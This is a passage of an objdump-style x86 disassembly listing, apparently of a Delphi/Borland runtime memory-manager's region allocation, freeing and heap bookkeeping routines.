  4016aa:	57                   	push   %edi
  4016ab:	55                   	push   %ebp
  4016ac:	51                   	push   %ecx
  4016ad:	8b d8                	mov    %eax,%ebx
  4016af:	8b f3                	mov    %ebx,%esi
  4016b1:	81 c6 ff 0f 00 00    	add    $0xfff,%esi
  4016b7:	81 e6 00 f0 ff ff    	and    $0xfffff000,%esi
  4016bd:	89 34 24             	mov    %esi,(%esp)
  4016c0:	8b eb                	mov    %ebx,%ebp
  4016c2:	03 ea                	add    %edx,%ebp
  4016c4:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  4016ca:	8b 04 24             	mov    (%esp),%eax
  4016cd:	89 01                	mov    %eax,(%ecx)
  4016cf:	8b c5                	mov    %ebp,%eax
  4016d1:	2b 04 24             	sub    (%esp),%eax
  4016d4:	89 41 04             	mov    %eax,0x4(%ecx)
  4016d7:	8b 35 e4 45 42 00    	mov    0x4245e4,%esi
  4016dd:	eb 38                	jmp    0x401717
  4016df:	8b 5e 08             	mov    0x8(%esi),%ebx
  4016e2:	8b 7e 0c             	mov    0xc(%esi),%edi
  4016e5:	03 fb                	add    %ebx,%edi
  4016e7:	3b 1c 24             	cmp    (%esp),%ebx
  4016ea:	73 03                	jae    0x4016ef
  4016ec:	8b 1c 24             	mov    (%esp),%ebx
  4016ef:	3b ef                	cmp    %edi,%ebp
  4016f1:	73 02                	jae    0x4016f5
  4016f3:	8b fd                	mov    %ebp,%edi
  4016f5:	3b fb                	cmp    %ebx,%edi
  4016f7:	76 1c                	jbe    0x401715
  4016f9:	68 00 40 00 00       	push   $0x4000
  4016fe:	2b fb                	sub    %ebx,%edi
  401700:	57                   	push   %edi
  401701:	53                   	push   %ebx
  401702:	e8 ad fb ff ff       	call   0x4012b4
  401707:	85 c0                	test   %eax,%eax
  401709:	75 0a                	jne    0x401715
  40170b:	c7 05 c0 45 42 00 02 	movl   $0x2,0x4245c0
  401712:	00 00 00 
  401715:	8b 36                	mov    (%esi),%esi
  401717:	81 fe e4 45 42 00    	cmp    $0x4245e4,%esi
  40171d:	75 c0                	jne    0x4016df
  40171f:	5a                   	pop    %edx
  401720:	5d                   	pop    %ebp
  401721:	5f                   	pop    %edi
  401722:	5e                   	pop    %esi
  401723:	5b                   	pop    %ebx
  401724:	c3                   	ret
  401725:	8d 40 00             	lea    0x0(%eax),%eax
  401728:	53                   	push   %ebx
  401729:	56                   	push   %esi
  40172a:	57                   	push   %edi
  40172b:	55                   	push   %ebp
  40172c:	83 c4 f8             	add    $0xfffffff8,%esp
  40172f:	8b f2                	mov    %edx,%esi
  401731:	8b f8                	mov    %eax,%edi
  401733:	bd f4 45 42 00       	mov    $0x4245f4,%ebp
  401738:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  40173e:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  401744:	8b 5d 00             	mov    0x0(%ebp),%ebx
  401747:	eb 33                	jmp    0x40177c
  401749:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  40174c:	7f 2c                	jg     0x40177a
  40174e:	8b ce                	mov    %esi,%ecx
  401750:	8b d7                	mov    %edi,%edx
  401752:	8b 43 08             	mov    0x8(%ebx),%eax
  401755:	e8 ba fe ff ff       	call   0x401614
  40175a:	83 3e 00             	cmpl   $0x0,(%esi)
  40175d:	74 50                	je     0x4017af
  40175f:	8b 46 04             	mov    0x4(%esi),%eax
  401762:	01 43 08             	add    %eax,0x8(%ebx)
  401765:	8b 46 04             	mov    0x4(%esi),%eax
  401768:	29 43 0c             	sub    %eax,0xc(%ebx)
  40176b:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  40176f:	75 3e                	jne    0x4017af
  401771:	8b c3                	mov    %ebx,%eax
  401773:	e8 ec fb ff ff       	call   0x401364
  401778:	eb 35                	jmp    0x4017af
  40177a:	8b 1b                	mov    (%ebx),%ebx
  40177c:	3b dd                	cmp    %ebp,%ebx
  40177e:	75 c9                	jne    0x401749
  401780:	8b d6                	mov    %esi,%edx
  401782:	8b c7                	mov    %edi,%eax
  401784:	e8 f7 fc ff ff       	call   0x401480
  401789:	83 3e 00             	cmpl   $0x0,(%esi)
  40178c:	74 21                	je     0x4017af
  40178e:	8b cc                	mov    %esp,%ecx
  401790:	8b d6                	mov    %esi,%edx
  401792:	8b c5                	mov    %ebp,%eax
  401794:	e8 e3 fb ff ff       	call   0x40137c
  401799:	83 3c 24 00          	cmpl   $0x0,(%esp)
  40179d:	75 a5                	jne    0x401744
  40179f:	8b cc                	mov    %esp,%ecx
  4017a1:	8b 56 04             	mov    0x4(%esi),%edx
  4017a4:	8b 06                	mov    (%esi),%eax
  4017a6:	e8 b1 fd ff ff       	call   0x40155c
  4017ab:	33 c0                	xor    %eax,%eax
  4017ad:	89 06                	mov    %eax,(%esi)
  4017af:	59                   	pop    %ecx
  4017b0:	5a                   	pop    %edx
  4017b1:	5d                   	pop    %ebp
  4017b2:	5f                   	pop    %edi
  4017b3:	5e                   	pop    %esi
  4017b4:	5b                   	pop    %ebx
  4017b5:	c3                   	ret
  4017b6:	8b c0                	mov    %eax,%eax
  4017b8:	53                   	push   %ebx
  4017b9:	56                   	push   %esi
  4017ba:	57                   	push   %edi
  4017bb:	55                   	push   %ebp
  4017bc:	83 c4 ec             	add    $0xffffffec,%esp
  4017bf:	89 0c 24             	mov    %ecx,(%esp)
  4017c2:	8b fa                	mov    %edx,%edi
  4017c4:	8b f0                	mov    %eax,%esi
  4017c6:	bd f4 45 42 00       	mov    $0x4245f4,%ebp
  4017cb:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  4017d1:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  4017d7:	8b 5d 00             	mov    0x0(%ebp),%ebx
  4017da:	eb 02                	jmp    0x4017de
  4017dc:	8b 1b                	mov    (%ebx),%ebx
  4017de:	3b dd                	cmp    %ebp,%ebx
  4017e0:	74 05                	je     0x4017e7
  4017e2:	3b 73 08             	cmp    0x8(%ebx),%esi
  4017e5:	75 f5                	jne    0x4017dc
  4017e7:	3b 73 08             	cmp    0x8(%ebx),%esi
  4017ea:	75 57                	jne    0x401843
  4017ec:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  4017ef:	0f 8e 96 00 00 00    	jle    0x40188b
  4017f5:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4017f9:	8b d7                	mov    %edi,%edx
  4017fb:	2b 53 0c             	sub    0xc(%ebx),%edx
  4017fe:	8b 43 08             	mov    0x8(%ebx),%eax
  401801:	03 43 0c             	add    0xc(%ebx),%eax
  401804:	e8 db fc ff ff       	call   0x4014e4
  401809:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40180e:	74 33                	je     0x401843
  401810:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401814:	8d 54 24 04          	lea    0x4(%esp),%edx
  401818:	8b c5                	mov    %ebp,%eax
  40181a:	e8 5d fb ff ff       	call   0x40137c
  40181f:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  401824:	75 b1                	jne    0x4017d7
  401826:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40182a:	8b 54 24 08          	mov    0x8(%esp),%edx
  40182e:	8b 44 24 04          	mov    0x4(%esp),%eax
  401832:	e8 25 fd ff ff       	call   0x40155c
  401837:	8b 04 24             	mov    (%esp),%eax
  40183a:	33 d2                	xor    %edx,%edx
  40183c:	89 10                	mov    %edx,(%eax)
  40183e:	e9 90 00 00 00       	jmp    0x4018d3
  401843:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401847:	8b d7                	mov    %edi,%edx
  401849:	8b c6                	mov    %esi,%eax
  40184b:	e8 94 fc ff ff       	call   0x4014e4
  401850:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401855:	74 34                	je     0x40188b
  401857:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40185b:	8d 54 24 04          	lea    0x4(%esp),%edx
  40185f:	8b c5                	mov    %ebp,%eax
  401861:	e8 16 fb ff ff       	call   0x40137c
  401866:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40186b:	0f 85 66 ff ff ff    	jne    0x4017d7
  401871:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401875:	8b 54 24 08          	mov    0x8(%esp),%edx
  401879:	8b 44 24 04          	mov    0x4(%esp),%eax
  40187d:	e8 da fc ff ff       	call   0x40155c
  401882:	8b 04 24             	mov    (%esp),%eax
  401885:	33 d2                	xor    %edx,%edx
  401887:	89 10                	mov    %edx,(%eax)
  401889:	eb 48                	jmp    0x4018d3
  40188b:	8b 6b 08             	mov    0x8(%ebx),%ebp
  40188e:	3b f5                	cmp    %ebp,%esi
  401890:	75 3a                	jne    0x4018cc
  401892:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  401895:	7f 35                	jg     0x4018cc
  401897:	8b 0c 24             	mov    (%esp),%ecx
  40189a:	8b d7                	mov    %edi,%edx
  40189c:	8b c5                	mov    %ebp,%eax
  40189e:	e8 71 fd ff ff       	call   0x401614
  4018a3:	8b 04 24             	mov    (%esp),%eax
  4018a6:	83 38 00             	cmpl   $0x0,(%eax)
  4018a9:	74 28                	je     0x4018d3
  4018ab:	8b 04 24             	mov    (%esp),%eax
  4018ae:	8b 40 04             	mov    0x4(%eax),%eax
  4018b1:	01 43 08             	add    %eax,0x8(%ebx)
  4018b4:	8b 04 24             	mov    (%esp),%eax
  4018b7:	8b 40 04             	mov    0x4(%eax),%eax
  4018ba:	29 43 0c             	sub    %eax,0xc(%ebx)
  4018bd:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  4018c1:	75 10                	jne    0x4018d3
  4018c3:	8b c3                	mov    %ebx,%eax
  4018c5:	e8 9a fa ff ff       	call   0x401364
  4018ca:	eb 07                	jmp    0x4018d3
  4018cc:	8b 04 24             	mov    (%esp),%eax
  4018cf:	33 d2                	xor    %edx,%edx
  4018d1:	89 10                	mov    %edx,(%eax)
  4018d3:	83 c4 14             	add    $0x14,%esp
  4018d6:	5d                   	pop    %ebp
  4018d7:	5f                   	pop    %edi
  4018d8:	5e                   	pop    %esi
  4018d9:	5b                   	pop    %ebx
  4018da:	c3                   	ret
  4018db:	90                   	nop
  4018dc:	53                   	push   %ebx
  4018dd:	56                   	push   %esi
  4018de:	57                   	push   %edi
  4018df:	83 c4 ec             	add    $0xffffffec,%esp
  4018e2:	8b f9                	mov    %ecx,%edi
  4018e4:	89 14 24             	mov    %edx,(%esp)
  4018e7:	8d 98 ff 3f 00 00    	lea    0x3fff(%eax),%ebx
  4018ed:	81 e3 00 c0 ff ff    	and    $0xffffc000,%ebx
  4018f3:	8b 34 24             	mov    (%esp),%esi
  4018f6:	03 f0                	add    %eax,%esi
  4018f8:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  4018fe:	3b de                	cmp    %esi,%ebx
  401900:	73 5b                	jae    0x40195d
  401902:	8b cf                	mov    %edi,%ecx
  401904:	8b d6                	mov    %esi,%edx
  401906:	2b d3                	sub    %ebx,%edx
  401908:	8b c3                	mov    %ebx,%eax
  40190a:	e8 99 fd ff ff       	call   0x4016a8
  40190f:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401913:	8b d7                	mov    %edi,%edx
  401915:	b8 f4 45 42 00       	mov    $0x4245f4,%eax
  40191a:	e8 5d fa ff ff       	call   0x40137c
  40191f:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  401923:	85 db                	test   %ebx,%ebx
  401925:	74 1f                	je     0x401946
  401927:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40192b:	8b 54 24 08          	mov    0x8(%esp),%edx
  40192f:	8b c3                	mov    %ebx,%eax
  401931:	e8 26 fc ff ff       	call   0x40155c
  401936:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40193a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40193e:	8b 44 24 10          	mov    0x10(%esp),%eax
  401942:	89 44 24 08          	mov    %eax,0x8(%esp)
  401946:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40194b:	74 14                	je     0x401961
  40194d:	8d 54 24 04          	lea    0x4(%esp),%edx
  401951:	b8 f4 45 42 00       	mov    $0x4245f4,%eax
  401956:	e8 91 fa ff ff       	call   0x4013ec
  40195b:	eb 04                	jmp    0x401961
  40195d:	33 c0                	xor    %eax,%eax
  40195f:	89 07                	mov    %eax,(%edi)
  401961:	83 c4 14             	add    $0x14,%esp
  401964:	5f                   	pop    %edi
  401965:	5e                   	pop    %esi
  401966:	5b                   	pop    %ebx
  401967:	c3                   	ret
  401968:	55                   	push   %ebp
  401969:	8b ec                	mov    %esp,%ebp
  40196b:	33 d2                	xor    %edx,%edx
  40196d:	55                   	push   %ebp
  40196e:	68 1e 1a 40 00       	push   $0x401a1e
  401973:	64 ff 32             	push   %fs:(%edx)
  401976:	64 89 22             	mov    %esp,%fs:(%edx)
  401979:	68 c4 45 42 00       	push   $0x4245c4
  40197e:	e8 39 f9 ff ff       	call   0x4012bc
  401983:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  40198a:	74 0a                	je     0x401996
  40198c:	68 c4 45 42 00       	push   $0x4245c4
  401991:	e8 2e f9 ff ff       	call   0x4012c4
  401996:	b8 e4 45 42 00       	mov    $0x4245e4,%eax
  40199b:	e8 8c f9 ff ff       	call   0x40132c
  4019a0:	b8 f4 45 42 00       	mov    $0x4245f4,%eax
  4019a5:	e8 82 f9 ff ff       	call   0x40132c
  4019aa:	b8 20 46 42 00       	mov    $0x424620,%eax
  4019af:	e8 78 f9 ff ff       	call   0x40132c
  4019b4:	68 f8 0f 00 00       	push   $0xff8
  4019b9:	6a 00                	push   $0x0
  4019bb:	e8 dc f8 ff ff       	call   0x40129c
  4019c0:	a3 1c 46 42 00       	mov    %eax,0x42461c
  4019c5:	83 3d 1c 46 42 00 00 	cmpl   $0x0,0x42461c
  4019cc:	74 2f                	je     0x4019fd
  4019ce:	b8 03 00 00 00       	mov    $0x3,%eax
  4019d3:	8b 15 1c 46 42 00    	mov    0x42461c,%edx
  4019d9:	33 c9                	xor    %ecx,%ecx
  4019db:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  4019df:	40                   	inc    %eax
  4019e0:	3d 01 04 00 00       	cmp    $0x401,%eax
  4019e5:	75 ec                	jne    0x4019d3
  4019e7:	b8 04 46 42 00       	mov    $0x424604,%eax
  4019ec:	89 40 04             	mov    %eax,0x4(%eax)
  4019ef:	89 00                	mov    %eax,(%eax)
  4019f1:	a3 10 46 42 00       	mov    %eax,0x424610
  4019f6:	c6 05 bc 45 42 00 01 	movb   $0x1,0x4245bc
  4019fd:	33 c0                	xor    %eax,%eax
  4019ff:	5a                   	pop    %edx
  401a00:	59                   	pop    %ecx
  401a01:	59                   	pop    %ecx
  401a02:	64 89 10             	mov    %edx,%fs:(%eax)
  401a05:	68 25 1a 40 00       	push   $0x401a25
  401a0a:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  401a11:	74 0a                	je     0x401a1d
  401a13:	68 c4 45 42 00       	push   $0x4245c4
  401a18:	e8 af f8 ff ff       	call   0x4012cc
  401a1d:	c3                   	ret
  401a1e:	e9 49 1a 00 00       	jmp    0x40346c
  401a23:	eb e5                	jmp    0x401a0a
  401a25:	a0 bc 45 42 00       	mov    0x4245bc,%al
  401a2a:	5d                   	pop    %ebp
  401a2b:	c3                   	ret
  401a2c:	55                   	push   %ebp
  401a2d:	8b ec                	mov    %esp,%ebp
  401a2f:	53                   	push   %ebx
  401a30:	80 3d bc 45 42 00 00 	cmpb   $0x0,0x4245bc
  401a37:	0f 84 cc 00 00 00    	je     0x401b09
  401a3d:	33 d2                	xor    %edx,%edx
  401a3f:	55                   	push   %ebp
  401a40:	68 02 1b 40 00       	push   $0x401b02
  401a45:	64 ff 32             	push   %fs:(%edx)
  401a48:	64 89 22             	mov    %esp,%fs:(%edx)
  401a4b:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  401a52:	74 0a                	je     0x401a5e
  401a54:	68 c4 45 42 00       	push   $0x4245c4
  401a59:	e8 66 f8 ff ff       	call   0x4012c4
  401a5e:	c6 05 bc 45 42 00 00 	movb   $0x0,0x4245bc
  401a65:	a1 1c 46 42 00       	mov    0x42461c,%eax
  401a6a:	50                   	push   %eax
  401a6b:	e8 34 f8 ff ff       	call   0x4012a4
  401a70:	33 c0                	xor    %eax,%eax
  401a72:	a3 1c 46 42 00       	mov    %eax,0x42461c
  401a77:	8b 1d e4 45 42 00    	mov    0x4245e4,%ebx
  401a7d:	eb 12                	jmp    0x401a91
  401a7f:	68 00 80 00 00       	push   $0x8000
  401a84:	6a 00                	push   $0x0
  401a86:	8b 43 08             	mov    0x8(%ebx),%eax
  401a89:	50                   	push   %eax
  401a8a:	e8 25 f8 ff ff       	call   0x4012b4
  401a8f:	8b 1b                	mov    (%ebx),%ebx
  401a91:	81 fb e4 45 42 00    	cmp    $0x4245e4,%ebx
  401a97:	75 e6                	jne    0x401a7f
  401a99:	b8 e4 45 42 00       	mov    $0x4245e4,%eax
  401a9e:	e8 89 f8 ff ff       	call   0x40132c
  401aa3:	b8 f4 45 42 00       	mov    $0x4245f4,%eax
  401aa8:	e8 7f f8 ff ff       	call   0x40132c
  401aad:	b8 20 46 42 00       	mov    $0x424620,%eax
  401ab2:	e8 75 f8 ff ff       	call   0x40132c
  401ab7:	a1 dc 45 42 00       	mov    0x4245dc,%eax
  401abc:	85 c0                	test   %eax,%eax
  401abe:	74 17                	je     0x401ad7
  401ac0:	8b 10                	mov    (%eax),%edx
  401ac2:	89 15 dc 45 42 00    	mov    %edx,0x4245dc
  401ac8:	50                   	push   %eax
  401ac9:	e8 d6 f7 ff ff       	call   0x4012a4
  401ace:	a1 dc 45 42 00       	mov    0x4245dc,%eax
  401ad3:	85 c0                	test   %eax,%eax
  401ad5:	75 e9                	jne    0x401ac0
  401ad7:	33 c0                	xor    %eax,%eax
  401ad9:	5a                   	pop    %edx
  401ada:	59                   	pop    %ecx
  401adb:	59                   	pop    %ecx
  401adc:	64 89 10             	mov    %edx,%fs:(%eax)
  401adf:	68 09 1b 40 00       	push   $0x401b09
  401ae4:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  401aeb:	74 0a                	je     0x401af7
  401aed:	68 c4 45 42 00       	push   $0x4245c4
  401af2:	e8 d5 f7 ff ff       	call   0x4012cc
  401af7:	68 c4 45 42 00       	push   $0x4245c4
  401afc:	e8 d3 f7 ff ff       	call   0x4012d4
  401b01:	c3                   	ret
  401b02:	e9 65 19 00 00       	jmp    0x40346c
  401b07:	eb db                	jmp    0x401ae4
  401b09:	5b                   	pop    %ebx
  401b0a:	5d                   	pop    %ebp
  401b0b:	c3                   	ret
  401b0c:	53                   	push   %ebx
  401b0d:	3b 05 10 46 42 00    	cmp    0x424610,%eax
  401b13:	75 09                	jne    0x401b1e
  401b15:	8b 50 04             	mov    0x4(%eax),%edx
  401b18:	89 15 10 46 42 00    	mov    %edx,0x424610
  401b1e:	8b 50 04             	mov    0x4(%eax),%edx
  401b21:	8b 48 08             	mov    0x8(%eax),%ecx
  401b24:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401b2a:	7f 38                	jg     0x401b64
  401b2c:	3b c2                	cmp    %edx,%eax
  401b2e:	75 17                	jne    0x401b47
  401b30:	85 c9                	test   %ecx,%ecx
  401b32:	79 03                	jns    0x401b37
  401b34:	83 c1 03             	add    $0x3,%ecx
  401b37:	c1 f9 02             	sar    $0x2,%ecx
  401b3a:	a1 1c 46 42 00       	mov    0x42461c,%eax
  401b3f:	33 d2                	xor    %edx,%edx
  401b41:	89 54 88 f4          	mov    %edx,-0xc(%eax,%ecx,4)
  401b45:	eb 24                	jmp    0x401b6b
  401b47:	85 c9                	test   %ecx,%ecx
  401b49:	79 03                	jns    0x401b4e
  401b4b:	83 c1 03             	add    $0x3,%ecx
  401b4e:	c1 f9 02             	sar    $0x2,%ecx
  401b51:	8b 1d 1c 46 42 00    	mov    0x42461c,%ebx
  401b57:	89 54 8b f4          	mov    %edx,-0xc(%ebx,%ecx,4)
  401b5b:	8b 00                	mov    (%eax),%eax
  401b5d:	89 02                	mov    %eax,(%edx)
  401b5f:	89 50 04             	mov    %edx,0x4(%eax)
  401b62:	5b                   	pop    %ebx
  401b63:	c3                   	ret
  401b64:	8b 00                	mov    (%eax),%eax
  401b66:	89 02                	mov    %eax,(%edx)
  401b68:	89 50 04             	mov    %edx,0x4(%eax)
  401b6b:	5b                   	pop    %ebx
  401b6c:	c3                   	ret
  401b6d:	8d 40 00             	lea    0x0(%eax),%eax
  401b70:	8b 15 20 46 42 00    	mov    0x424620,%edx
  401b76:	eb 10                	jmp    0x401b88
  401b78:	8b 4a 08             	mov    0x8(%edx),%ecx
  401b7b:	3b c1                	cmp    %ecx,%eax
  401b7d:	72 07                	jb     0x401b86
  401b7f:	03 4a 0c             	add    0xc(%edx),%ecx
  401b82:	3b c1                	cmp    %ecx,%eax
  401b84:	72 16                	jb     0x401b9c
  401b86:	8b 12                	mov    (%edx),%edx
  401b88:	81 fa 20 46 42 00    	cmp    $0x424620,%edx
  401b8e:	75 e8                	jne    0x401b78
  401b90:	c7 05 c0 45 42 00 03 	movl   $0x3,0x4245c0
  401b97:	00 00 00 
  401b9a:	33 d2                	xor    %edx,%edx
  401b9c:	8b c2                	mov    %edx,%eax
  401b9e:	c3                   	ret
  401b9f:	90                   	nop
  401ba0:	53                   	push   %ebx
  401ba1:	8b ca                	mov    %edx,%ecx
  401ba3:	83 e9 04             	sub    $0x4,%ecx
  401ba6:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401ba9:	83 fa 10             	cmp    $0x10,%edx
  401bac:	7c 0f                	jl     0x401bbd
  401bae:	c7 03 07 00 00 80    	movl   $0x80000007,(%ebx)
  401bb4:	8b d1                	mov    %ecx,%edx
  401bb6:	e8 b9 01 00 00       	call   0x401d74
  401bbb:	5b                   	pop    %ebx
  401bbc:	c3                   	ret
  401bbd:	83 fa 04             	cmp    $0x4,%edx
  401bc0:	7c 0c                	jl     0x401bce
  401bc2:	8b ca                	mov    %edx,%ecx
  401bc4:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401bca:	89 08                	mov    %ecx,(%eax)
  401bcc:	89 0b                	mov    %ecx,(%ebx)
  401bce:	5b                   	pop    %ebx
  401bcf:	c3                   	ret
  401bd0:	ff 05 ac 45 42 00    	incl   0x4245ac
  401bd6:	8b d0                	mov    %eax,%edx
  401bd8:	83 ea 04             	sub    $0x4,%edx
  401bdb:	8b 12                	mov    (%edx),%edx
  401bdd:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401be3:	83 ea 04             	sub    $0x4,%edx
  401be6:	01 15 b0 45 42 00    	add    %edx,0x4245b0
  401bec:	e8 f3 05 00 00       	call   0x4021e4
  401bf1:	c3                   	ret
  401bf2:	8b c0                	mov    %eax,%eax
  401bf4:	83 fa 0c             	cmp    $0xc,%edx
  401bf7:	7c 0e                	jl     0x401c07
  401bf9:	83 ca 02             	or     $0x2,%edx
  401bfc:	89 10                	mov    %edx,(%eax)
  401bfe:	83 c0 04             	add    $0x4,%eax
  401c01:	e8 ca ff ff ff       	call   0x401bd0
  401c06:	c3                   	ret
  401c07:	83 fa 04             	cmp    $0x4,%edx
  401c0a:	7c 0a                	jl     0x401c16
  401c0c:	8b ca                	mov    %edx,%ecx
  401c0e:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401c14:	89 08                	mov    %ecx,(%eax)
  401c16:	03 c2                	add    %edx,%eax
  401c18:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401c1b:	c3                   	ret
  401c1c:	53                   	push   %ebx
  401c1d:	56                   	push   %esi
  401c1e:	8b d0                	mov    %eax,%edx
  401c20:	83 ea 04             	sub    $0x4,%edx
  401c23:	8b 12                	mov    (%edx),%edx
  401c25:	8b ca                	mov    %edx,%ecx
  401c27:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401c2d:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401c33:	74 0a                	je     0x401c3f
  401c35:	c7 05 c0 45 42 00 04 	movl   $0x4,0x4245c0
  401c3c:	00 00 00 
  401c3f:	8b da                	mov    %edx,%ebx
  401c41:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401c47:	2b c3                	sub    %ebx,%eax
  401c49:	8b c8                	mov    %eax,%ecx
  401c4b:	33 11                	xor    (%ecx),%edx
  401c4d:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
  401c53:	74 0a                	je     0x401c5f
  401c55:	c7 05 c0 45 42 00 05 	movl   $0x5,0x4245c0
  401c5c:	00 00 00 
  401c5f:	f6 01 01             	testb  $0x1,(%ecx)
  401c62:	74 20                	je     0x401c84
  401c64:	8b d0                	mov    %eax,%edx
  401c66:	83 ea 0c             	sub    $0xc,%edx
  401c69:	8b 72 08             	mov    0x8(%edx),%esi
  401c6c:	2b c6                	sub    %esi,%eax
  401c6e:	3b 70 08             	cmp    0x8(%eax),%esi
  401c71:	74 0a                	je     0x401c7d
  401c73:	c7 05 c0 45 42 00 06 	movl   $0x6,0x4245c0
  401c7a:	00 00 00 
  401c7d:	e8 8a fe ff ff       	call   0x401b0c
  401c82:	03 de                	add    %esi,%ebx
  401c84:	8b c3                	mov    %ebx,%eax
  401c86:	5e                   	pop    %esi
  401c87:	5b                   	pop    %ebx
  401c88:	c3                   	ret
  401c89:	8d 40 00             	lea    0x0(%eax),%eax
  401c8c:	53                   	push   %ebx
  401c8d:	56                   	push   %esi
  401c8e:	57                   	push   %edi
  401c8f:	8b d8                	mov    %eax,%ebx
  401c91:	33 ff                	xor    %edi,%edi
  401c93:	8b 03                	mov    (%ebx),%eax
  401c95:	a9 00 00 00 80       	test   $0x80000000,%eax
  401c9a:	74 0b                	je     0x401ca7
  401c9c:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401ca1:	03 f8                	add    %eax,%edi
  401ca3:	03 d8                	add    %eax,%ebx
  401ca5:	8b 03                	mov    (%ebx),%eax
  401ca7:	a8 02                	test   $0x2,%al
  401ca9:	75 13                	jne    0x401cbe
  401cab:	8b f3                	mov    %ebx,%esi
  401cad:	8b c6                	mov    %esi,%eax
  401caf:	e8 58 fe ff ff       	call   0x401b0c
  401cb4:	8b 46 08             	mov    0x8(%esi),%eax
  401cb7:	03 f8                	add    %eax,%edi
  401cb9:	03 d8                	add    %eax,%ebx
  401cbb:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401cbe:	8b c7                	mov    %edi,%eax
  401cc0:	5f                   	pop    %edi
  401cc1:	5e                   	pop    %esi
  401cc2:	5b                   	pop    %ebx
  401cc3:	c3                   	ret
  401cc4:	53                   	push   %ebx
  401cc5:	56                   	push   %esi
  401cc6:	57                   	push   %edi
  401cc7:	55                   	push   %ebp
  401cc8:	83 c4 f4             	add    $0xfffffff4,%esp
  401ccb:	8b fa                	mov    %edx,%edi
  401ccd:	8b f0                	mov    %eax,%esi
  401ccf:	c6 04 24 00          	movb   $0x0,(%esp)
  401cd3:	8b c6                	mov    %esi,%eax
  401cd5:	e8 96 fe ff ff       	call   0x401b70
  401cda:	8b d8                	mov    %eax,%ebx
  401cdc:	85 db                	test   %ebx,%ebx
  401cde:	0f 84 82 00 00 00    	je     0x401d66
  401ce4:	8b 6b 08             	mov    0x8(%ebx),%ebp
  401ce7:	8b c5                	mov    %ebp,%eax
  401ce9:	03 43 0c             	add    0xc(%ebx),%eax
  401cec:	8b d0                	mov    %eax,%edx
  401cee:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  401cf1:	2b d1                	sub    %ecx,%edx
  401cf3:	83 fa 0c             	cmp    $0xc,%edx
  401cf6:	7f 04                	jg     0x401cfc
  401cf8:	8b f8                	mov    %eax,%edi
  401cfa:	2b fe                	sub    %esi,%edi
  401cfc:	8b c6                	mov    %esi,%eax
  401cfe:	2b c5                	sub    %ebp,%eax
  401d00:	83 f8 0c             	cmp    $0xc,%eax
  401d03:	7d 14                	jge    0x401d19
  401d05:	8d 4c 24 01          	lea    0x1(%esp),%ecx
  401d09:	8b d6                	mov    %esi,%edx
  401d0b:	2b 53 08             	sub    0x8(%ebx),%edx
  401d0e:	03 d7                	add    %edi,%edx
  401d10:	8b c5                	mov    %ebp,%eax
  401d12:	e8 c5 fb ff ff       	call   0x4018dc
  401d17:	eb 11                	jmp    0x401d2a
  401d19:	8d 4c 24 01          	lea    0x1(%esp),%ecx
  401d1d:	8b d7                	mov    %edi,%edx
  401d1f:	83 ea 04             	sub    $0x4,%edx
  401d22:	8d 46 04             	lea    0x4(%esi),%eax
  401d25:	e8 b2 fb ff ff       	call   0x4018dc
  401d2a:	8b 6c 24 01          	mov    0x1(%esp),%ebp
  401d2e:	85 ed                	test   %ebp,%ebp
  401d30:	74 34                	je     0x401d66
  401d32:	8b d5                	mov    %ebp,%edx
  401d34:	2b d6                	sub    %esi,%edx
  401d36:	8b c6                	mov    %esi,%eax
  401d38:	e8 63 fe ff ff       	call   0x401ba0
  401d3d:	8b c5                	mov    %ebp,%eax
  401d3f:	03 44 24 05          	add    0x5(%esp),%eax
  401d43:	8b 53 08             	mov    0x8(%ebx),%edx
  401d46:	03 53 0c             	add    0xc(%ebx),%edx
  401d49:	3b c2                	cmp    %edx,%eax
  401d4b:	73 0a                	jae    0x401d57
  401d4d:	8d 14 37             	lea    (%edi,%esi,1),%edx
  401d50:	2b d0                	sub    %eax,%edx
  401d52:	e8 9d fe ff ff       	call   0x401bf4
  401d57:	8d 54 24 01          	lea    0x1(%esp),%edx
  401d5b:	8b c3                	mov    %ebx,%eax
